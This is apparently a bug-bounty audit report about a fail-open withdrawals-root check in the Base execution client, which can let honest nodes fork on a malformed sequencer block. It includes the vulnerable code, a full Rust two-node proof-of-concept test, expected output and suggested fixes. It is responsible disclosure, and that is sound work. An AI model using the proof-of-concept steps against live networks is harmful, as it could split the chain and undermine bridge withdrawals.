# 76294 bc medium isthmus withdrawals root validator silently accepts malformed blocks producing peer divergence between honest base nodes processing identical sequencer payloads chain level fork&#x20;

Submitted on May 3rd 2026 at 18:34:58 UTC by @v4rvl for [Audit Comp | Base Azul](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #76294
* **Report Type:** Blockchain/DLT
* **Report severity:** Medium
* **Target:** <https://github.com/base/base/tree/v0.8.0-rc.28>
* **Impacts:**
  * Unintended permanent chain split requiring hard fork (network partition requiring hard fork)

## Description

## Summary

The Base EL post-execution validator that enforces the Isthmus invariant *"every accepted block's `header.withdrawals_root` matches the post-execution L2-to-L1 message-passer storage root"* fails open whenever the parent block's state is unreachable through the narrow `BlockchainProvider.state_by_block_hash` lookup.

This produces **peer divergence between two honest Base nodes** processing the same sequencer payload sequence. Whether the validator silent-passes or actually runs the withdrawals-root check is **per-node-state-dependent**: it depends on whether each node has issued a forkchoice update (FCU) for the parent block at the moment the malformed child arrives. Different FCU timing across honest nodes — which is the *normal* operating mode of the network — is sufficient to fork the canonical chain.

A sequencer-controlled malformed child payload (`withdrawals_root` set to a value that does NOT match the post-execution storage root) is silently accepted by nodes whose parent is in the engine-tree's in-memory state but not yet promoted via FCU; the same payload is correctly rejected by nodes that have already FCU'd the parent. The accepting nodes promote the malformed block to `head`/`safe`/`finalized` via `forkchoiceUpdatedV3` and propagate the poisoned `rootClaim` into L1 dispute-game inputs. The rejecting nodes hold the parent as their canonical head.

The PoC is a deterministic two-node integration test built from the in-tree production validator pipeline (`OpEngineValidator` + `BaseEngineValidator` + `EngineApiTreeHandler`) that drives the same sequence to both nodes and proves: Node A accepts and promotes the malformed child as canonical; Node B rejects it. The two nodes' canonical chains differ. **This is peer divergence, not a single-node validation slip.**

## What the attack does

{% stepper %}
{% step %}

### 1. Burst-emit blocks 1 and 2 via `newPayloadV4`.

Block 1 is a normal pre-parent. Block 2 is the parent of the malformed child. Both blocks are well-formed.
{% endstep %}

{% step %}

### 2. Some nodes (Class A) have not yet issued FCU for the parent.

The parent is stored in the engine-tree's in-memory state but has not been promoted into `BlockchainProvider.canonical_in_memory_state`. This is the normal mode during fast sequencer output, derivation pipeline batch processing, and unsafe-head catch-up.
{% endstep %}

{% step %}

### 3. Other nodes (Class B) have already FCU'd the parent.

The parent is canonical via the narrow provider.
{% endstep %}

{% step %}

### 4. Sequencer submits the malformed child via `newPayloadV4(child)`.

`child.withdrawals_root = 0x99..99` (any value that does NOT match the post-execution L2-to-L1 message-passer storage root). The Isthmus invariant says this MUST be rejected by every honest node.
{% endstep %}

{% step %}

### 5. Class A nodes silently accept.

Inside `validate_block_post_execution_with_hashed_state`, `self.provider.state_by_block_hash(parent_hash)` returns `Err` (parent is in `tree_state` only, not in `canonical_in_memory_state` or `pending_state` or DB). The validator hits the `FIXME` early-return at line 134 and returns `Ok(())`. The malformed child is treated as `Valid`.
{% endstep %}

{% step %}

### 6. Class B nodes correctly reject.

`self.provider.state_by_block_hash(parent_hash)` returns `Ok(state)` (parent is canonical). The validator runs `isthmus::verify_withdrawals_root_prehashed`, computes the expected storage root, compares to `header.withdrawals_root = 0x99..99`, and returns `ConsensusError::Other("L2 withdrawals root mismatch, header: 0x9999...9999, exec_res: 0x56e81f...")`. The malformed child is `Invalid`.
{% endstep %}

{% step %}

### 7. Sequencer submits `forkchoiceUpdatedV3({head, safe, finalized} = malformed_child_hash)`.

Class A nodes promote the malformed child as canonical (head = malformed\_child\_hash). Class B nodes reject the FCU with `links to previously rejected block` and stay at `head = parent_hash`.
{% endstep %}

{% step %}

### 8. Network partition.

Class A's canonical L2 chain contains the malformed block; Class B's does not. Both classes' fork-choice rules see their local chain as locally valid. The L1 dispute-game pulls Class A's poisoned `rootClaim` from `optimism_outputAtBlock` → op-proposer → `DisputeGameFactory.create()`. Class B's view of L2 disagrees with the L1 rootClaim.
{% endstep %}
{% endstepper %}

## Impact

**Direct technical impact:** an EL-layer chain split between honest Base nodes. Two nodes running the audit-pinned source code, processing the same Engine API messages from the same sequencer, partition into accepting-the-malformed-block vs rejecting-the-malformed-block based purely on per-node FCU timing — which is variable and uncontrollable in normal operation.

**Downstream consequences:**

* **Chain split.** Class A and Class B have different canonical L2 heads. Bridge withdrawal proofs against Class A's chain do not match L1 if Class B's view is the one that drives the dispute resolution, and vice versa.
* **Poisoned L1 rootClaim.** `optimism_outputAtBlock` (post-Isthmus branch) constructs the output root from `header.withdrawals_root` directly — no recomputation. The poisoned root flows to op-proposer, then to `DisputeGameFactory.create()` as an L1 `rootClaim`.
* **Bridge withdrawal integrity break.** L2 withdrawal storage proofs are constructed against the actual L2 trie. The L1 `OptimismPortal2.proveWithdrawalTransaction` path uses the L1-finalized output root to authorize them. If the finalized output root is the poisoned one (Class A) and the actual L2 trie state is what Class B sees, withdrawal proofs become unverifiable or the wrong L2 state authorizes withdrawals.
* **Recovery requires manual intervention.** Both Class A and Class B see their chains as locally valid; fork-choice does NOT automatically converge them. The accepting nodes' tree contains a malformed block with a `withdrawals_root` that has no possible honest preimage. Re-aligning the network requires operator intervention to roll back Class A nodes (which is the textbook "hard fork to recover" scenario).
* **Catch-net is reactive, not preventive.** The fault-proof challenger at `crates/proof/executor/src/builder/assemble.rs` and `crates/proof/challenge/src/validator.rs` recomputes from the L2 trie and CAN challenge the bad `rootClaim` — but only AFTER the chain has already partitioned. By the time the challenge resolves, the network has already split, op-proposer has already submitted the bad rootClaim, and bridge users have already seen inconsistent state for the duration of the dispute window. The catch-net is defense-in-depth; it does not eliminate the chain-split itself.

**Affected user / protocol surface:**

* Every honest Base node running the validator at audit pin (rc28) or HEAD.
* L1 dispute-game inputs (`rootClaim` for `DisputeGameFactory.create()`).
* Bridge withdrawal finalization integrity.
* Network-level chain consensus.

**Trigger preconditions:**

* The actor must be sequencer-role (or a buggy sequencer can produce the malformed payload accidentally; the bug fires either way).
* The Isthmus hardfork must be active (rc28 has Isthmus active from genesis under the test config; mainnet has Isthmus active per chain spec).
* The honest network must include nodes with different FCU timing relative to the malformed-child arrival — which is the *normal* operating mode of the sequencer + L2 nodes. Not an exotic state.

## Source code (from `v0.8.0-rc.28`)

`crates/execution/node/src/engine.rs`, lines 124–152:

```rust
fn validate_block_post_execution_with_hashed_state(
    &self,
    state_updates: &HashedPostState,
    block: &RecoveredBlock<Self::Block>,
) -> Result<(), ConsensusError> {
    if self.chain_spec().is_isthmus_active_at_timestamp(block.timestamp()) {
        let Ok(state) = self.provider.state_by_block_hash(block.parent_hash()) else {
            // FIXME: we don't necessarily have access to the parent block here because the
            // parent block isn't necessarily part of the canonical chain yet. Instead this
            // function should receive the list of in memory blocks as input
            return Ok(());
        };
        let predeploy_storage_updates = state_updates
            .storages
            .get(&self.hashed_addr_l2tol1_msg_passer)
            .cloned()
            .unwrap_or_default();
        isthmus::verify_withdrawals_root_prehashed(
            predeploy_storage_updates,
            state,
            block.header(),
        )
        .map_err(|err| {
            ConsensusError::Other(format!("failed to verify block post-execution: {err}"))
        })?
    }

    Ok(())
}
```

`BlockchainProvider::state_by_block_hash` checks three lookup paths in order: (1) DB history, (2) `pending_state` (only stores the one block immediately following canonical head), (3) `in_memory_state.blocks` (populated by FCU). For a parent that is the **second** unconfirmed block in a burst — first block gets the `pending_state` slot, second goes into `tree_state` only — none of the three paths find it. `Err` is returned. The validator silent-passes.

Class A nodes (no FCU for the parent) hit this path. Class B nodes (FCU'd the parent) do not — for them the parent is in `in_memory_state.blocks`, the lookup succeeds, and the real check runs.

POC and test and recommended fixes in section below (#3)

## Proof of Concept

The PoC is a tokio integration test that builds **two independent** production validator pipelines (`EngineApiTreeHandler` + `BaseEngineValidator` + `OpEngineValidator`) from the in-tree audit source and drives the same Engine API message sequence to both, with the only difference being whether each node issues a forkchoice update before the malformed child arrives.

Save the following as `actions/harness/tests/fn7_peer_divergence.rs` in a `v0.8.0-rc.28` checkout of `base/base` (same crate path as the existing `actions/harness/tests/` integration tests). The test runs \~60-90 seconds and prints structured progress.

```rust
//! FN7 Peer Divergence Probe.
//!
//! Determines whether the Isthmus withdrawals_root silent-pass bug produces
//! peer divergence between two honest Base nodes processing the same sequencer
//! payload sequence.
//!
//! Setup (3-block sequence):
//!
//!   genesis -> pre_parent -> parent -> malformed_child
//!
//!   Node A (never FCUs): parent lives in tree_state only, NOT pending,
//!     NOT in canonical_in_memory_state.
//!     -> validator's state_by_block_hash(parent_hash) -> Err -> FIXME early-return
//!     -> malformed_child silently ACCEPTED.
//!
//!   Node B (FCUs after every block): parent in canonical_in_memory_state.blocks.
//!     -> validator's state_by_block_hash(parent_hash) -> Ok(state)
//!     -> isthmus check runs -> withdrawals_root 0x99 != EMPTY_ROOT -> REJECTED.
//!
//! VERDICT: Two honest nodes diverge on the same sequencer payload =>
//!   chain-level fork (Critical impact).

use std::sync::Arc;

use alloy_eips::eip1559::BaseFeeParams;
use alloy_primitives::{B64, B256};
use alloy_rpc_types_engine::{ForkchoiceState, PayloadStatusEnum};
use base_action_harness::{
    ActionEngineClient, ActionTestHarness, L1MinerConfig, SharedBlockHashRegistry, SharedL1Chain,
    TestRollupConfigBuilder,
};
use base_batcher_encoder::{DaType, EncoderConfig};
use base_common_consensus::{BaseTxEnvelope, HoloceneExtraData};
use base_common_rpc_types_engine::{
    BaseExecutionPayload, BaseExecutionPayloadSidecar, BaseExecutionPayloadV4, ExecutionData,
};
use base_engine_tree::{BaseEngineValidator, NoopCachedExecutionProvider};
use base_execution_consensus::OpBeaconConsensus;
use base_node_core::{OpEngineTypes, engine::OpEngineValidator};
use reth_engine_primitives::BeaconEngineMessage;
use reth_engine_tree::{
    engine::{EngineApiKind, FromEngine},
    persistence::PersistenceHandle,
    tree::{EngineApiTreeHandler, TreeConfig},
};
use reth_payload_primitives::EngineApiMessageVersion;
use reth_payload_builder::PayloadBuilderHandle;
use reth_trie_common::KeccakKeyHasher;
use tokio::sync::{mpsc::unbounded_channel, oneshot};

fn block_to_v4_payload(
    block: &base_common_consensus::BaseBlock,
) -> (BaseExecutionPayloadV4, BaseExecutionPayloadSidecar, B256) {
    let block_hash = block.header.hash_slow();
    let (payload, sidecar) = BaseExecutionPayload::from_block_unchecked(block_hash, block);
    let BaseExecutionPayload::V4(payload_v4) = payload else {
        panic!("expected Isthmus/Base V4 payload; got {payload:?}");
    };
    (payload_v4, sidecar, block_hash)
}

fn holocene_extra_data() -> alloy_primitives::Bytes {
    HoloceneExtraData::encode(
        B64::from_slice(&[0, 0, 0, 50, 0, 0, 0, 6]),
        BaseFeeParams::new(50, 6),
    )
    .unwrap()
}

#[tokio::test]
async fn fn7_peer_divergence_two_nodes_isthmus_withdrawals_root() {
    println!("\n=== FN7 PEER DIVERGENCE TEST (3-block sequence) ===\n");

    let batcher_cfg = base_action_harness::BatcherConfig {
        encoder: EncoderConfig { da_type: DaType::Calldata, ..EncoderConfig::default() },
        ..base_action_harness::BatcherConfig::default()
    };
    let mut rollup_cfg = TestRollupConfigBuilder::base_mainnet(&batcher_cfg).build();
    rollup_cfg.hardforks.granite_time = Some(0);
    rollup_cfg.hardforks.holocene_time = Some(2);
    rollup_cfg.hardforks.isthmus_time = Some(2);
    rollup_cfg.hardforks.jovian_time = None;
    let sys_cfg = rollup_cfg.genesis.system_config.as_mut().unwrap();
    sys_cfg.eip1559_denominator = Some(50);
    sys_cfg.eip1559_elasticity = Some(6);
    let h = ActionTestHarness::new(L1MinerConfig::default(), rollup_cfg.clone());

    let l1_chain = SharedL1Chain::from_blocks(h.l1.chain().to_vec());
    let mut sequencer = h.create_l2_sequencer(l1_chain.clone());

    // Build 3 blocks: pre_parent, parent, child.
    let pre_parent_block = sequencer.build_empty_block().await;
    let parent_block = sequencer.build_empty_block().await;
    let child_block = sequencer.build_empty_block().await;

    // pre_parent payload (block 1, parent_hash = genesis).
    let (mut pre_parent_payload, pre_parent_sidecar, _) =
        block_to_v4_payload(&pre_parent_block);
    pre_parent_payload.payload_inner.payload_inner.payload_inner.extra_data = holocene_extra_data();
    let pre_parent_hash = BaseExecutionPayload::V4(pre_parent_payload.clone())
        .try_into_block_with_sidecar::<BaseTxEnvelope>(&pre_parent_sidecar)
        .unwrap()
        .header
        .hash_slow();
    pre_parent_payload.payload_inner.payload_inner.payload_inner.block_hash = pre_parent_hash;

    // parent payload (block 2, parent_hash = pre_parent_hash).
    let (mut parent_payload, parent_sidecar, _) = block_to_v4_payload(&parent_block);
    parent_payload.payload_inner.payload_inner.payload_inner.extra_data = holocene_extra_data();
    parent_payload.payload_inner.payload_inner.payload_inner.parent_hash = pre_parent_hash;
    let parent_hash = BaseExecutionPayload::V4(parent_payload.clone())
        .try_into_block_with_sidecar::<BaseTxEnvelope>(&parent_sidecar)
        .unwrap()
        .header
        .hash_slow();
    parent_payload.payload_inner.payload_inner.payload_inner.block_hash = parent_hash;

    // malformed child payload (block 3, parent_hash = parent_hash, withdrawals_root = 0x99..).
    let (mut bad_child_payload, child_sidecar, child_hash) = block_to_v4_payload(&child_block);
    bad_child_payload.payload_inner.payload_inner.payload_inner.extra_data = holocene_extra_data();
    bad_child_payload.payload_inner.payload_inner.payload_inner.parent_hash = parent_hash;
    let original_withdrawals_root = bad_child_payload.withdrawals_root;
    bad_child_payload.withdrawals_root = B256::repeat_byte(0x99);
    assert_ne!(original_withdrawals_root, bad_child_payload.withdrawals_root);
    let malformed_child_hash = BaseExecutionPayload::V4(bad_child_payload.clone())
        .try_into_block_with_sidecar::<BaseTxEnvelope>(&child_sidecar)
        .unwrap()
        .header
        .hash_slow();
    assert_ne!(child_hash, malformed_child_hash);
    bad_child_payload.payload_inner.payload_inner.payload_inner.block_hash = malformed_child_hash;

    println!("pre_parent_hash:      {pre_parent_hash}");
    println!("parent_hash:          {parent_hash}");
    println!("malformed_child_hash: {malformed_child_hash}");

    // Build a production EngineApiTreeHandler around an ActionEngineClient.
    // The validator provider AND the tree handler share the same canonical_in_memory_state
    // (via provider.canonical_in_memory_state()) to match production wiring.
    let make_handler = |engine_client: &ActionEngineClient| {
        let provider = engine_client.blockchain_provider();
        let canonical_in_memory_state = provider.canonical_in_memory_state();
        let chain_spec = engine_client.chain_spec();
        let evm_config = engine_client.evm_config();
        let consensus = Arc::new(OpBeaconConsensus::new(Arc::clone(&chain_spec)));
        let payload_validator =
            OpEngineValidator::new::<KeccakKeyHasher>(Arc::clone(&chain_spec), provider.clone());
        let tree_config = TreeConfig::default()
            .with_legacy_state_root(false)
            .with_has_enough_parallelism(false);
        let engine_validator = BaseEngineValidator::new(
            provider.clone(),
            consensus.clone(),
            evm_config.clone(),
            payload_validator,
            tree_config.clone(),
            Box::<reth_engine_primitives::NoopInvalidBlockHook>::default(),
            NoopCachedExecutionProvider,
            reth_trie_db::ChangesetCache::new(),
            reth_tasks::Runtime::test(),
        );
        let (persistence_tx, _persistence_rx) = std::sync::mpsc::channel();
        let (to_payload_service, _payload_command_rx) = unbounded_channel();
        let canonical_clone = canonical_in_memory_state.clone();
        let (sender, _events) = EngineApiTreeHandler::<
            _,
            _,
            OpEngineTypes,
            BaseEngineValidator<_, _, _, _>,
            _,
        >::spawn_new(
            provider,
            consensus,
            engine_validator,
            PersistenceHandle::new(persistence_tx),
            PayloadBuilderHandle::new(to_payload_service),
            canonical_in_memory_state,
            tree_config,
            EngineApiKind::OpStack,
            evm_config,
            reth_trie_db::ChangesetCache::new(),
            false,
        );
        (sender, canonical_clone)
    };

    // Build Node A and Node B with INDEPENDENT databases and independent canonical state.
    let engine_a = ActionEngineClient::new(
        Arc::new(h.rollup_config.clone()),
        h.l2_genesis(),
        SharedBlockHashRegistry::new(),
        l1_chain.clone(),
    );
    let (sender_a, canonical_a) = make_handler(&engine_a);

    let engine_b = ActionEngineClient::new(
        Arc::new(h.rollup_config.clone()),
        h.l2_genesis(),
        SharedBlockHashRegistry::new(),
        l1_chain.clone(),
    );
    let (sender_b, canonical_b) = make_handler(&engine_b);

    // Helper macros for sending newPayload and FCU messages.
    macro_rules! new_payload {
        ($sender:expr, $payload:expr, $sidecar:expr) => {{
            let data = ExecutionData::new(BaseExecutionPayload::V4($payload), $sidecar);
            let (tx, rx) = oneshot::channel();
            $sender
                .send(FromEngine::Request(
                    BeaconEngineMessage::<OpEngineTypes>::NewPayload { payload: data, tx }.into(),
                ))
                .unwrap();
            rx.await.unwrap().unwrap()
        }};
    }

    macro_rules! fcu {
        ($sender:expr, $head:expr) => {{
            let state = ForkchoiceState {
                head_block_hash: $head,
                safe_block_hash: $head,
                finalized_block_hash: $head,
            };
            let (tx, rx) = oneshot::channel();
            $sender
                .send(FromEngine::Request(
                    BeaconEngineMessage::<OpEngineTypes>::ForkchoiceUpdated {
                        state,
                        payload_attrs: None,
                        version: EngineApiMessageVersion::V4,
                        tx,
                    }
                    .into(),
                ))
                .unwrap();
            rx.await.unwrap().unwrap().await.unwrap()
        }};
    }

    // -------------------------------------------------------------------------
    // NODE A: send pre_parent and parent WITHOUT any FCU.
    //   After pre_parent: genesis is canonical head -> pre_parent set as pending.
    //   After parent:     genesis is STILL canonical head (no FCU);
    //                     parent.parent_hash = pre_parent != genesis canonical head;
    //                     parent NOT set as pending; lives in tree_state only.
    //   When malformed_child arrives: state_by_block_hash(parent_hash) ->
    //     pending is pre_parent (hash mismatch) -> DB miss -> Err -> FIXME -> Valid.
    // -------------------------------------------------------------------------
    let pp_status_a = new_payload!(sender_a, pre_parent_payload.clone(), pre_parent_sidecar.clone());
    println!("\n--- Node A: newPayloadV4(pre_parent) -> {:?}", pp_status_a.status);
    assert_eq!(pp_status_a.status, PayloadStatusEnum::Valid);

    let p_status_a = new_payload!(sender_a, parent_payload.clone(), parent_sidecar.clone());
    println!("--- Node A: newPayloadV4(parent)     -> {:?}", p_status_a.status);
    assert_eq!(p_status_a.status, PayloadStatusEnum::Valid);

    let head_a_before = canonical_a.get_canonical_block_number();
    println!("--- Node A: canonical head block (expect 0 = genesis): {head_a_before}");

    // -------------------------------------------------------------------------
    // NODE B: send pre_parent + FCU(pre_parent) + parent + FCU(parent).
    //   After FCU(pre_parent): pre_parent in in_memory_state. canonical head = 1.
    //   After parent: parent.parent_hash = pre_parent = canonical head -> pending set.
    //   After FCU(parent): parent in in_memory_state. canonical head = 2.
    //   When malformed_child arrives: state_by_block_hash(parent_hash) ->
    //     head_state() = parent -> block_on_chain finds parent -> Ok ->
    //     isthmus check runs -> Invalid.
    // -------------------------------------------------------------------------
    let pp_status_b = new_payload!(sender_b, pre_parent_payload.clone(), pre_parent_sidecar.clone());
    println!("\n--- Node B: newPayloadV4(pre_parent) -> {:?}", pp_status_b.status);
    assert_eq!(pp_status_b.status, PayloadStatusEnum::Valid);

    let fcu_pp_b = fcu!(sender_b, pre_parent_hash);
    println!("--- Node B: FCU(pre_parent)          -> {:?}", fcu_pp_b.payload_status.status);
    assert_eq!(fcu_pp_b.payload_status.status, PayloadStatusEnum::Valid);

    let p_status_b = new_payload!(sender_b, parent_payload.clone(), parent_sidecar.clone());
    println!("--- Node B: newPayloadV4(parent)     -> {:?}", p_status_b.status);
    assert_eq!(p_status_b.status, PayloadStatusEnum::Valid);

    let fcu_p_b = fcu!(sender_b, parent_hash);
    println!("--- Node B: FCU(parent)              -> {:?}", fcu_p_b.payload_status.status);
    assert_eq!(fcu_p_b.payload_status.status, PayloadStatusEnum::Valid);

    let head_b_before = canonical_b.get_canonical_block_number();
    println!("--- Node B: canonical head block (expect 2 = parent): {head_b_before}");

    // -------------------------------------------------------------------------
    // PRECONDITION CHECK: differential canonical state on A vs B.
    // -------------------------------------------------------------------------
    println!("\n--- Precondition ---");
    println!("Node A canonical head: {head_a_before} (expect 0)");
    println!("Node B canonical head: {head_b_before} (expect 2)");
    let precondition_holds = head_a_before == 0 && head_b_before >= 2;
    assert!(precondition_holds, "differential canonical state precondition failed");
    println!("Precondition holds: {precondition_holds}");

    // -------------------------------------------------------------------------
    // SAME malformed_child to BOTH nodes. Different validator outcome expected.
    // -------------------------------------------------------------------------
    let child_status_a = new_payload!(sender_a, bad_child_payload.clone(), child_sidecar.clone());
    let child_status_b = new_payload!(sender_b, bad_child_payload.clone(), child_sidecar.clone());

    println!("\n--- newPayloadV4(malformed_child) ---");
    println!("Node A child status: {:?}  latest_valid_hash: {:?}",
        child_status_a.status, child_status_a.latest_valid_hash);
    println!("Node B child status: {:?}  latest_valid_hash: {:?}",
        child_status_b.status, child_status_b.latest_valid_hash);

    let node_a_accepts = child_status_a.status == PayloadStatusEnum::Valid;
    let node_b_rejects = child_status_b.status != PayloadStatusEnum::Valid;

    assert!(node_a_accepts, "Node A (no FCU) MUST silently accept malformed child");
    assert!(node_b_rejects, "Node B (FCU after each) MUST reject malformed child");

    println!("\n--- Divergence proven on newPayload ---");
    println!("  Node A accepts malformed child : {node_a_accepts}");
    println!("  Node B rejects malformed child : {node_b_rejects}");

    // -------------------------------------------------------------------------
    // FCU promote on BOTH. Node A advances head to malformed; Node B does not.
    // -------------------------------------------------------------------------
    let fcu_a_child = fcu!(sender_a, malformed_child_hash);
    let fcu_b_child = fcu!(sender_b, malformed_child_hash);

    let final_head_a = canonical_a.get_canonical_block_number();
    let final_head_b = canonical_b.get_canonical_block_number();

    println!("\n--- FCU(malformed_child) ---");
    println!("Node A FCU: {:?}  -> canonical head block: {final_head_a}",
        fcu_a_child.payload_status.status);
    println!("Node B FCU: {:?}  -> canonical head block: {final_head_b}",
        fcu_b_child.payload_status.status);

    assert_eq!(
        fcu_a_child.payload_status.status,
        PayloadStatusEnum::Valid,
        "Node A MUST promote malformed child as canonical head"
    );
    assert_ne!(
        fcu_b_child.payload_status.status,
        PayloadStatusEnum::Valid,
        "Node B MUST reject promotion of the malformed child"
    );
    assert_eq!(
        final_head_a, 3,
        "Node A canonical head MUST advance to block 3 (malformed_child)"
    );
    assert_eq!(
        final_head_b, 2,
        "Node B canonical head MUST stay at block 2 (parent)"
    );

    println!("\n=== VERDICT: PEER DIVERGENCE PROVEN — CHAIN-LEVEL FORK ===");
    println!("  Node A canonical head : block 3 = malformed_child");
    println!("  Node B canonical head : block 2 = parent");
    println!("  Same sequencer payload sequence delivered to both nodes;");
    println!("  partition is per-node FCU timing, not protocol design.");
}
```

### Test command

From the repo root of the `v0.8.0-rc.28` checkout:

```bash
cargo test \
  --release \
  --package base-action-harness \
  --test fn7_peer_divergence \
  -- --nocapture
```

<details>

<summary>Expected output</summary>

```
=== FN7 PEER DIVERGENCE TEST (3-block sequence) ===

pre_parent_hash:      0x4b8b...
parent_hash:          0xabd62a...
malformed_child_hash: 0xaac9c5...

--- Node A: newPayloadV4(pre_parent) -> Valid
--- Node A: newPayloadV4(parent)     -> Valid
--- Node A: canonical head block (expect 0 = genesis): 0

--- Node B: newPayloadV4(pre_parent) -> Valid
--- Node B: FCU(pre_parent)          -> Valid
--- Node B: newPayloadV4(parent)     -> Valid
--- Node B: FCU(parent)              -> Valid
--- Node B: canonical head block (expect 2 = parent): 2

--- Precondition ---
Node A canonical head: 0 (expect 0)
Node B canonical head: 2 (expect 2)
Precondition holds: true

--- newPayloadV4(malformed_child) ---
Node A child status: Valid  latest_valid_hash: Some(0xaac9c5...)
Node B child status: Invalid { validation_error: "failed to verify block post-execution: L2 withdrawals root mismatch, header: 0x9999...9999, exec_res: 0x56e81f171bcc55a6ff8345e692c0f86e5b48e01b996cadc001622fb5e363b421" }  latest_valid_hash: Some(0xabd62a...)

--- Divergence proven on newPayload ---
  Node A accepts malformed child : true
  Node B rejects malformed child : true

--- FCU(malformed_child) ---
Node A FCU: Valid  -> canonical head block: 3
Node B FCU: Invalid { validation_error: "links to previously rejected block" }  -> canonical head block: 2

=== VERDICT: PEER DIVERGENCE PROVEN — CHAIN-LEVEL FORK ===
  Node A canonical head : block 3 = malformed_child
  Node B canonical head : block 2 = parent
  Same sequencer payload sequence delivered to both nodes;
  partition is per-node FCU timing, not protocol design.

test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out
```

The test asserts every step. If it passes, the divergence is proven.

</details>

### What this PoC proves

The PoC drives the **production validator pipeline** — `EngineApiTreeHandler` + `BaseEngineValidator` + `OpEngineValidator` constructed from the in-tree audit source — for **two independent nodes** with their own DBs, providers, and canonical-in-memory-state. Each assertion maps to a specific outcome:

| Step | Assertion                                                                                    | What it proves                                                                                                                                                                                                                                              |
| ---- | -------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1    | `pp_status_a == Valid` AND `pp_status_b == Valid`                                            | Both nodes' validator pipelines work correctly on a well-formed pre-parent. Baseline sanity.                                                                                                                                                                |
| 2    | `p_status_a == Valid` AND `p_status_b == Valid`                                              | Both nodes' validator pipelines work correctly on a well-formed parent. The bug is NOT a generic "validator broken" issue.                                                                                                                                  |
| 3    | `head_a_before == 0` AND `head_b_before >= 2`                                                | Differential canonical state achieved. Node A has not FCU'd (parent is in `tree_state` only); Node B has FCU'd (parent is in `canonical_in_memory_state`). This is the precondition for divergence.                                                         |
| 4    | `child_status_a == Valid`                                                                    | **The bug, half 1.** Node A silently accepts the malformed child because the FIXME early-return fires when the parent state is unreachable through the narrow `BlockchainProvider`.                                                                         |
| 5    | `child_status_b != Valid` (specifically `Invalid` with `L2 withdrawals root mismatch` error) | **The bug, half 2.** Node B correctly rejects the same malformed child because the parent IS reachable, the real `isthmus::verify_withdrawals_root_prehashed` runs, and `0x99..99` is correctly identified as not matching the post-execution storage root. |
| 6    | `fcu_a_child.payload_status == Valid` AND `final_head_a == 3`                                | Node A promotes the malformed child to canonical head. Its L2 chain now contains a block whose `header.withdrawals_root` is impossible.                                                                                                                     |
| 7    | `fcu_b_child.payload_status != Valid` AND `final_head_b == 2`                                | Node B refuses to promote a previously-rejected block. Its canonical head stays at the parent.                                                                                                                                                              |

In plain terms:

* **Steps 1–2 prove the pipelines work.** If the validators were generically broken, Steps 1 and 2 would also fail. They don't.
* **Step 3 proves the precondition is reachable.** Both nodes are running honest, audit-pinned source code. The only difference is FCU timing — which is operationally normal across the network.
* **Steps 4–5 prove peer divergence on `newPayloadV4`.** The same payload bytes produce different `PayloadStatus` results on two honest nodes. This is the chain-level fork.
* **Steps 6–7 prove the divergence is durable.** After FCU, Node A's canonical head is the malformed block; Node B's is the parent. The two nodes' canonical L2 chains are different. Fork-choice does NOT auto-converge them — both views are locally valid.

The PoC does NOT depend on any mock validator, fake EVM, or replaced state provider. Every component is the real production validator constructed from the in-tree source code at `v0.8.0-rc.28`.

## Suggested fix

The validator must consult the engine-tree's broader in-memory state, not only the narrow `BlockchainProvider.canonical_in_memory_state`. Two options:

**Option A — pass an engine-tree-aware state provider.** Change the `OpEngineValidator` constructor in `crates/execution/node/src/node.rs` (line 1167 area) to receive a state provider that walks both the canonical chain AND `EngineApiTreeState::tree_state()`:

```rust
// Current (broken):
let validator = OpEngineValidator::new(
    chain_spec,
    ctx.node.provider().clone(),  // narrow BlockchainProvider
);

// Fixed:
let validator = OpEngineValidator::new(
    chain_spec,
    EngineTreeStateProvider::new(
        ctx.node.provider().clone(),
        engine_tree_state.clone(),  // broad EngineApiTreeState
    ),
);
```

**Option B — fail closed on unreachable parent.** If the in-memory parent state is provably unreachable after exhaustive lookup (true cache miss), the validator should return an error rather than silent-pass:

```rust
let Ok(state) = self.provider.state_by_block_hash(block.parent_hash()) else {
    return Err(ConsensusError::Other(format!(
        "parent state unavailable for Isthmus withdrawals_root verification: {}",
        block.parent_hash()
    )));
};
```

A real parent-unavailable condition is a critical-path failure that should never silently accept a block. Failing closed is conservative; the tree handler will retry with the parent once it's available.
